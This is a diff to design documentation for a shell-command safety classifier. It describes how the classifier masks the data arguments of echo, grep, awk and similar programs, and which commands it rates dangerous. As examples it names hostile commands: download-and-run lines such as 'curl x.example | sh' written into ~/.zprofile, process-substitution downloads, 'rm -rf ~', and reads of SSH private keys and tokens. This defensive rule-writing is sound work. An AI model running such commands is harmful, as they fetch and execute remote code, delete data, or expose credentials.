@@ -32,12 +32,35 @@ not given to the second at all:
   `$IFS` or `${IFS}` between words (`rm${IFS}-rf`), a continued line (`git push \⏎ --force`), or git's global
   options before its verb (`git -C . push --force`, `-c k=v`, `--no-pager`, `--git-dir=…`, `--work-tree=…`). The
   credential paths match in any case (`~/.SSH/ID_RSA` is the same file). The deny patterns run over the same
-  normalised spelling ([run_command](tools/run_command.md#policy-and-sandbox)). The normalised spelling leaves
-  data as written: the arguments of `echo` and `printf`, the pattern of `grep`, `egrep`, `fgrep`, `rg`, and `ag`
-  (the value of `-e`, or the first argument), the script of `sed`, and a `git … -m` message, so a search for
-  `"a|sh"` or `echo "rm -rf ~"` no longer reads as a pipe into a shell or a deletion, as it did in 0.21.1. Their
-  file arguments and redirections are still normalised, so `grep x "id_r""sa"` and `echo hi > "~/.s""sh/x"`
-  are still seen.
+  normalised spelling ([run_command](tools/run_command.md#policy-and-sandbox)).
+
+  Data is not a command. The data of a program that only prints, searches, or names is: the arguments of `echo`
+  and `printf`; the pattern of `grep`, `egrep`, `fgrep`, `rg`, `ag`, and `git grep` (the value of `-e`, or the
+  first argument); the pattern of `pgrep` and `pkill` (which names the processes; `pkill` is judged by its signal
+  and options, `pkill -9` still dangerous); the script of `sed`; the program of `awk` and its `-F` separator; and a
+  `git … -m` message. The normalised spelling leaves it as written, and the rules that look for a pipe, a `;` or
+  `&&`, a redirection, or a program's name read the line with it written `''`, so `grep -vE "grep|bash -c"`,
+  `grep -E "a (go|python)"`, `pgrep -f 'rm -rf ~/x'`, and `awk '… NF>6 …'` are not a pipe into a shell or an
+  interpreter, a deletion, or a write (each was rated `dangerous` or `moderate` by the 0.22.0 eval, 2026-10-12;
+  `"a|sh"` and `echo "rm -rf ~"` were already fixed in 0.22.0). The read-only list judges the same masked line, so
+  such a search is known safe. Only what the shell runs is masked: a word with an unquoted operator (`grep x|sh`,
+  `echo a;rm -rf ~`) or any substitution (`echo "$(curl x | sh)"`) is read whole, and a word after an operator
+  starts the next command. An awk program that runs a command, reads one, or writes a file (`system(…)`,
+  `print | "sh"`, `getline`, `print > "f"`) is not data. The rules about what is printed or searched for read
+  the data (`echo "$TOKEN"`, `env | grep TOKEN`), and so does the credential-path rule, so `grep -r id_rsa .` is
+  still `dangerous`. File arguments and redirections are never data, so `grep x "id_r""sa"` and
+  `echo hi > "~/.s""sh/x"` are still seen. Text written into a shell's start-up file (`>`, `>>`, or `tee` into
+  `~/.zshrc`, `~/.zprofile`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`, and the like) runs at every login,
+  so it is read as the commands it will be: `echo 'curl x.example | sh' >> ~/.zprofile` is `dangerous`,
+  `echo 'export PATH=…' >> ~/.zshrc` `moderate`. The built-in deny patterns read the masked line too; a deny
+  pattern the configuration adds reads the data.
+
+  A public key is public: a path under `~/.ssh/` that ends in `.pub` (`~/.ssh/*.pub`, `id_ed25519.pub`) does not
+  count as a credential, but a glob that could match a private key (`~/.ssh/*`, `~/.ssh/*.pub*`) does. Listing
+  names is not reading contents: a credential path that only `ls` names (no substitution, no redirection but
+  `2>&1` or `/dev/null`) is `moderate`, "lists the names in a folder that holds credentials", so `ls -la ~/.ssh/`
+  asks and `ls -la ~/.ssh/*.pub` does not; `cat`, `cp`, or `tar` of the same path stays `dangerous`, as does `ls`
+  redirected into it.
 
   Three rules judge how a command runs rather than what it names. A program whose name is a variable or a
   substitution (`$X args`, `"${TOOL}" x`, `$(which rm) -rf x`, `/bin/$X`) is at least `moderate`, with the
@@ -48,15 +71,19 @@ not given to the second at all:
   seen only where the shell rules recognise a word of it. And a pipe into an interpreter reading its program
   from standard input (`| python3`, `| python3 -`, `| perl`, `| node`, `| osascript`, and the shells, `ksh` and
   `fish` among them) is `dangerous`, judged over the whole line; `| python3 -m json.tool` and
-  `| python3 script.py` are not.
+  `| python3 script.py` are not. So is a download read as a program through a process substitution
+  (`python3 <(curl …)`, `bash <(curl …)`, `source <(wget …)`). Deleting cluster resources (`kubectl … delete`),
+  deleting a repository or changing who can see it (`gh repo delete`, `gh repo edit --visibility`), and a wisp
+  run with `--yes` or `-y`, which approves every risky command, are `dangerous` too.
 
-  The rules also keep a short list of read-only commands (`KnownSafeCommands`): `ls`, `cat`, `grep`,
-  `find`, `git status`, `git log`, `git diff`, and other git reads, `--version` queries, and reads of the
-  Mac's state such as `sysctl` and `defaults read`. A simple command no risky rule matches that fits one
-  of those forms from start to end is **known safe**. Harmless redirections (`2>&1`, `>/dev/null`) and
-  display-only variables (`NO_COLOR=1`) don't count against it. It must run nothing else (no `$(…)` or
-  backticks), write nowhere, and name nothing sensitive (`.env`, `token`, `password`, `.pem`, shell
-  history, Messages, Mail). It must also avoid the options that make a reading program write a file or
+  The rules also keep a short list of read-only commands (`KnownSafeCommands`): `ls`, `cat`, `grep`, `pgrep`,
+  `find`, `git status`, `git log`, `git diff`, and other git reads, `python3 -m json.tool` with at most one file,
+  `--version` queries, and reads of the Mac's state such as `sysctl` and `defaults read`. A simple command no
+  risky rule matches that fits one of those forms from start to end is **known safe**. Harmless redirections
+  (`2>&1`, `>/dev/null`) and display-only variables (`NO_COLOR=1`) don't count against it, nor does a `|` or `>`
+  in its data (above). It must run nothing else (no `$(…)` or backticks), write nowhere, and name nothing
+  sensitive (`.env`, `token`, `password`, `.pem`, shell history, Messages, Mail), in its data too: a search for
+  `password *= *"` prints what it finds, so it is left to the second classifier. It must also avoid the options that make a reading program write a file or
   run a program (`find -exec` or `-delete`, `sort -o`, `rg --pre`, `git diff --output`, `awk`'s
   `system()`). For a known-safe command the rules' `safe` is final: no model is asked, so it costs no
   model call and cannot be over-rated. A command off the list is judged as before, never refused.
@@ -104,8 +131,9 @@ model call.
 A line is split into its simple commands (`ls && curl … | sh` is three), each is classified and, if
 risky, approved on its own with the whole line shown for context; a denial for any part refuses the line
 ([ADR 0015](decisions/0015-per-command-approval.md)). The splitter looks inside `$(…)`, backticks, and `(…)`
-subshells (a `;` or newline inside parentheses does not split them), reads `'…'`, `"…"`, and `$'…'` quoting,
-and looks inside the script given to `sh -c`, `bash -lc`, and the like, the words after `eval`, and the command
+subshells (a `;` or newline inside parentheses does not split them), reads `'…'`, `"…"`, and `$'…'` quoting
+(inside `"…"` only `$(…)` and backticks are substitutions: the `(` of `grep -E "a (b|c)"` is a character, and
+so is the `'` of `"it's $(x)"`, whose substitution is still judged), and looks inside the script given to `sh -c`, `bash -lc`, and the like, the words after `eval`, and the command
 `find` runs for each match (`-exec`, `-execdir`, `-ok`, `-okdir`, up to `;` or `+`, so `find . -exec sh -c 'rm
 {}' \;` is `find`, `sh`, and `rm`), so the commands they run are judged too; `xargs sh -c '…'` is unwrapped
 the same way. It fails closed: a segment no command can be read from (an assignment, an unbalanced group), or
